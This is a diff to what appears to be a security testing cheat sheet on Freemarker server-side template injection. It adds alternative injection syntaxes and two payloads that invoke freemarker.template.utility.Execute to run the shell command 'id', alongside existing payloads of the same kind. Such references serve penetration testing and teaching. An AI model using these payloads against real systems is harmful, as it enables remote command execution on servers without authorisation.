@@ -199,7 +199,7 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 ### Freemarker - Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`.
+The template can be `${3*3}`  `#{3*3}` or the legacy `[=3*3]`.
 
 ### Freemarker - Read File
 
@@ -214,6 +214,8 @@ Convert the returned bytes to ASCII
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
 ```
 
 ### Freemarker - Sandbox bypass
